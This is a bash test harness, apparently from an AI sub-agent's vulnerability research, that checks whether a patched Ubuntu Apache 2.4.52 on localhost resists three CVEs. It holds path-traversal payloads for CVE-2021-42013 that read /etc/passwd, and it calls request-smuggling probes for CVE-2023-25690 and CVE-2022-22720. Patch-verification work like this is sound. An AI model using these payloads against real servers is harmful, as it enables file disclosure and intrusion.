#!/bin/bash
# 子智能体 A：用 Ubuntu Apache/2.4.52（含发行版安全修复）做三个 CVE 的负向对照实验
set -u
ROOT="/mnt/e/强网拟态/cve/apache"
NEG=/tmp/apacheA/neg
BIN=/usr/sbin/apache2
MODS=/usr/lib/apache2/modules
PORT=8090
rm -rf "$NEG"; mkdir -p "$NEG" /tmp/apacheA/neg/42013 /tmp/apacheA/neg/25690 /tmp/apacheA/neg/22720
HPID=""
cleanup() {
  if [ -n "$HPID" ]; then
    kill -TERM -- -"$HPID" 2>/dev/null || kill -TERM "$HPID" 2>/dev/null || true
  fi
  sleep 0.4
  if [ -n "$HPID" ]; then kill -KILL -- -"$HPID" 2>/dev/null || true; fi
}
trap cleanup EXIT INT TERM

prep() { # $1 src conf, $2 dst conf, $3 tag
  sed -e 's#^LoadModule unixd_module.*#\# unixd is static in Ubuntu build#' \
      -e 's#^LoadModule log_config_module.*#\# log_config is static in Ubuntu build#' \
      -e "s#modules/#$MODS/#g" \
      -e "s#/tmp/apacheA/#/tmp/apacheA/neg/#g" \
      "$1" > "$2"
  sed -i "1i LoadModule mpm_event_module $MODS/mod_mpm_event.so" "$2"
  sed -i "1i DefaultRuntimeDir /tmp/apacheA/neg/$3" "$2"
}

start() { # $1 conf
  mkdir -p /tmp/apacheA/neg
  setsid "$BIN" -f "$1" -DFOREGROUND > /tmp/apacheA/neg/console_$2.log 2>&1 &
  HPID=$!
  for i in $(seq 1 60); do
    curl -s -o /dev/null --max-time 1 "http://127.0.0.1:$PORT/" && break
    sleep 0.2
  done
  curl -s -o /dev/null --max-time 2 "http://127.0.0.1:$PORT/" || {
    echo "START FAILED for $1"; tail -30 /tmp/apacheA/neg/console_$2.log; return 1; }
}
stop() {
  kill -TERM -- -"$HPID" 2>/dev/null || true
  sleep 0.5
  kill -KILL -- -"$HPID" 2>/dev/null || true
  HPID=""
}

echo "=== version ==="
$BIN -v; dpkg-query -W -f='apache2-bin=${Version}\n' apache2-bin

echo
echo "=== 42013 negative (Ubuntu 2.4.52) ==="
prep "$ROOT/conf/CVE-2021-42013.conf" "$NEG/42013.conf" 42013
start "$NEG/42013.conf" 42013 || exit 2
{
  echo "== single =="
  curl -sS -i --path-as-is "http://127.0.0.1:$PORT/icons/.%2e/.%2e/.%2e/.%2e/etc/passwd" | head -12
  echo "== double =="
  curl -sS -i --path-as-is "http://127.0.0.1:$PORT/icons/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/passwd" | head -12
  echo "== error_log =="; tail -8 /tmp/apacheA/neg/error_log 2>/dev/null
} > /tmp/apacheA/neg/42013_result.txt 2>&1
cat /tmp/apacheA/neg/42013_result.txt
stop

echo
echo "=== 25690 negative (Ubuntu 2.4.52) ==="
rm -f /tmp/apacheA/neg/backend.log
python3 "$ROOT/poc/CVE-2023-25690/backend.py" /tmp/apacheA/neg/backend.log 8091 > /tmp/apacheA/neg/backend_console.log 2>&1 &
BPID=$!
sleep 0.4
prep "$ROOT/conf/CVE-2023-25690.conf" "$NEG/25690.conf" 25690
start "$NEG/25690.conf" 25690 || { kill "$BPID"; exit 2; }
python3 "$ROOT/poc/CVE-2023-25690/probe.py" "$PORT" smuggle /tmp/apacheA/neg/25690_client.txt
sleep 0.5
echo "== backend log =="; cat /tmp/apacheA/neg/backend.log 2>/dev/null
echo "== error_log =="; tail -12 /tmp/apacheA/neg/error_log 2>/dev/null
kill "$BPID" 2>/dev/null || true
stop

echo
echo "=== 22720 negative (Ubuntu 2.4.52) ==="
mkdir -p /tmp/apacheA/neg/22720/htdocs/denied
printf '<html><body>index</body></html>\n' > /tmp/apacheA/neg/22720/htdocs/index.html
printf 'SMUGGLED_SECOND_REQUEST\n' > /tmp/apacheA/neg/22720/htdocs/smuggled.html
prep "$ROOT/conf/CVE-2022-22720.conf" "$NEG/22720.conf" 22720
start "$NEG/22720.conf" 22720 || exit 2
python3 "$ROOT/poc/CVE-2022-22720/probe.py" "$PORT" timeout403 /tmp/apacheA/neg/22720_client.txt
echo "== error_log =="; tail -12 /tmp/apacheA/neg/error_log 2>/dev/null
stop

echo
echo "=== summary ==="
echo "42013 single 200? $(grep -c 'root:x:0:0' /tmp/apacheA/neg/42013_result.txt || true)"
echo "25690 backend REQUEST_LINES=2? $(grep -c 'REQUEST_LINES=2' /tmp/apacheA/neg/backend.log || true)"
echo "22720 smuggled? $(grep -c 'resp2_body_smuggled=True' /tmp/apacheA/neg/22720_client.txt || true)"
